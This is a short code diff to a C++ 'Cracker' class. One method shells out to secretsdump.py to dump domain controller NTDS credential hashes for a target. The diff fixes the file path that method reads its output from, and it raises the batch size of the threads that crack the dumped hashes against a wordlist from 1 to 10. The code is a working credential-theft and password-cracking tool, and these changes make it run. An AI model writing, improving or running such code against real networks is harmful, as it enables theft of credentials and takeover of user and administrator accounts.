@@ -120,7 +120,7 @@ class Cracker {
         std::string get_ntds() {
             setenv("TARGET", target.c_str(), 1);
             system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
-            ifstream fin("/tmp/output2.txt");
+            ifstream fin("/tmp/output.txt");
             string output = "";
             while (fin) {
                 string line; 
@@ -209,7 +209,7 @@ class Cracker {
                 threads.emplace_back(
                     &Cracker::crack, this, std::cref(wl), kv.second.c_str(), kv.first.c_str()
                 );
-                if (threads.size() == 1) {
+                if (threads.size() == 10) {
                     for (auto& thread : threads) {
                         thread.join();
                     }
